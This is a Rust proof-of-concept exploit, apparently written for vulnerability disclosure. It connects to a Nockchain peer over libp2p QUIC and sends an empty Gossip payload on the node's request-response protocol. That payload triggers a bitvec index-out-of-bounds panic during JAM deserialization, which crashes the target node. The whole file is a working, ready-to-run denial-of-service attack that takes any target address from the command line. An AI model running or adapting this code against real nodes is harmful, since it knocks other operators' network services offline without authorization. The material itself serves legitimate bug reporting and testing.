//! Minimal PoC: P2P JAM Bitvec Index Out of Bounds
//!
//! Sending an empty payload via Gossip triggers a panic in bitvec
//! during JAM deserialization (cue_into).
//!
//! Crash location: bitvec-1.0.1/src/slice/api.rs:2594
//!   "index 0 out of bounds: 0"
//!
//! Usage:
//!   cargo run --release -- /ip4/<TARGET>/udp/<PORT>/quic-v1

use libp2p::{
    futures::StreamExt,
    identity,
    request_response::{self, cbor, ProtocolSupport},
    swarm::SwarmEvent,
    Multiaddr, PeerId, StreamProtocol,
};
use serde::{Deserialize, Serialize};
use serde_bytes::ByteBuf;
use std::{env, time::Duration};
use tokio::time::timeout;

const REQ_RES_PROTOCOL: &str = "/nockchain-1-req-res";

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum NockchainRequest {
    Gossip { message: ByteBuf },
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum NockchainResponse {
    Ack { acked: bool },
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args: Vec<String> = env::args().collect();
    if args.len() < 2 {
        eprintln!("Usage: {} <target-multiaddr>", args[0]);
        std::process::exit(1);
    }

    let target_addr: Multiaddr = args[1].parse()?;

    println!("PoC: P2P JAM Bitvec Index Out of Bounds");
    println!("========================================");
    println!("Target: {}", target_addr);
    println!();
    println!("Payload: 0 bytes (empty)");
    println!();

    let local_key = identity::Keypair::generate_ed25519();
    let local_peer_id = PeerId::from(local_key.public());
    println!("Local Peer ID: {}", local_peer_id);

    let mut swarm = libp2p::SwarmBuilder::with_existing_identity(local_key)
        .with_tokio()
        .with_quic()
        .with_behaviour(|_key| {
            let protocol = StreamProtocol::new(REQ_RES_PROTOCOL);
            let cfg = request_response::Config::default()
                .with_request_timeout(Duration::from_secs(10));

            cbor::Behaviour::<NockchainRequest, NockchainResponse>::new(
                [(protocol, ProtocolSupport::Full)],
                cfg,
            )
        })?
        .with_swarm_config(|c| c.with_idle_connection_timeout(Duration::from_secs(30)))
        .build();

    swarm.dial(target_addr.clone())?;

    let mut sent = false;

    loop {
        match timeout(Duration::from_secs(10), swarm.select_next_some()).await {
            Ok(event) => match event {
                SwarmEvent::ConnectionEstablished { peer_id, .. } => {
                    println!("Connected to {}", peer_id);

                    // Empty payload triggers bitvec panic
                    let req = NockchainRequest::Gossip {
                        message: ByteBuf::from(vec![]),
                    };
                    swarm.behaviour_mut().send_request(&peer_id, req);
                    println!("Sent empty payload via Gossip");
                    sent = true;
                }
                SwarmEvent::Behaviour(request_response::Event::Message { .. }) => {
                    println!("Got response");
                    break;
                }
                SwarmEvent::Behaviour(request_response::Event::OutboundFailure { error, .. }) => {
                    println!("Request failed: {:?}", error);
                    break;
                }
                SwarmEvent::ConnectionClosed { cause, .. } => {
                    println!("Connection closed: {:?}", cause);
                    break;
                }
                _ => {}
            },
            Err(_) => {
                if sent {
                    println!("Timeout (expected if server crashed)");
                } else {
                    println!("Timeout connecting");
                }
                break;
            }
        }
    }

    println!();
    println!("Server should show:");
    println!("  panicked at bitvec-1.0.1/src/slice/api.rs:2594:4:");
    println!("  index 0 out of bounds: 0");

    Ok(())
}
